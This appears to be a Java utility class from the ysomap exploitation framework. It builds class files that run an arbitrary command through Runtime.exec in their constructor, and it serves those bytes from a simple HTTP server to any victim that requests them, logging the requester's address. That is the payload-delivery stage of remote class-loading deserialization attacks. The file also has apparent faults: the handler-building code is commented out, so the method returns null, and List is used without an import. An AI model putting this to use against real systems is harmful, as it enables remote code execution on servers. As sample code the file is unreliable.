package ysomap.core.util;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;
import okhttp3.*;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.util.Map;
import java.util.concurrent.TimeUnit;

/**
 * @author wh1t3P1g
 * @since 2020/2/17
 */
public class HTTPHelper {

    private static OkHttpClient client = new OkHttpClient.Builder()
                                    .connectTimeout(3, TimeUnit.SECONDS)
                                    .build();


    public static HttpServer makeSimpleHTTPServer(int port, Map<String, HttpHandler> paths) throws IOException {
        HttpServer server = HttpServer.create(new InetSocketAddress(port), 0);
        for(Map.Entry<String, HttpHandler> path: paths.entrySet()){
            server.createContext(path.getKey(), path.getValue());
        }
        server.setExecutor(null);
        return server;
    }

    public static HttpHandler makeHTTPHandler(String filename, String body) throws Exception {
        HttpHandler handler = null;
        if(body.startsWith("code:")){
            body = body.substring(5);
        }else{
            body = "java.lang.Runtime.getRuntime().exec(\"" +
                    body.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
                    "\");";
        }

        byte[] obj = ClassFiles.makeClassWithDefaultConstructor(
                filename.replace(".class",""), body);

//        if(filename.endsWith(".class")){
//            handler = new PayloadHandler(obj);
//        }else if(filename.endsWith(".jar")){
//            handler = new PayloadHandler(
//                    ClassFiles.makeJarFile(filename, obj));
//        }
        return handler;
    }


    public static class PayloadHandler implements HttpHandler {

        private byte[] obj;

        public PayloadHandler(byte[] obj) throws Exception {
            this.obj = obj;
        }

        @Override
        public void handle(HttpExchange exchange) throws IOException {
            System.err.println("Have request from "+exchange.getRemoteAddress());
            System.err.println("Get request <"+exchange.getRequestMethod()+"> "+exchange.getRequestURI());
            exchange.sendResponseHeaders(200, obj.length);
            OutputStream os = exchange.getResponseBody();
            os.write(obj);
            os.close();
            System.err.println("return payload and close");
        }
    }

    public static Response post(String url, RequestBody body, Headers headers){
        Request request = new Request.Builder()
                .url(url)
                .headers(headers)
                .post(body)
                .build();
//        Proxy proxy = new Proxy(Proxy.Type.HTTP,
//                new InetSocketAddress("127.0.0.1", 7890));
//
//        client = new OkHttpClient.Builder()
//                .proxy(proxy)
//                .build();
        try(Response response = client.newCall(request).execute()){
            Logger.success("Status Code: "+response.code());
            Logger.success("Response Headers:");
            Map<String, List<String>> responseHeaders = response.headers().toMultimap();
            for(Map.Entry entry:responseHeaders.entrySet()){
                Logger.normal(entry.getKey()+":"+entry.getValue());
            }
            Logger.success("Response Body:");
            Logger.normal(response.body().string());
            return response;
        } catch (IOException e) {
            e.printStackTrace();
            return null;
        }
    }

    public static Response get(String url, Headers headers){
        Request request = new Request.Builder()
                .url(url)
                .headers(headers)
                .build();
        try(Response response = client.newCall(request).execute()){
            return response;
        } catch (IOException e) {
            return null;
        }
    }

}
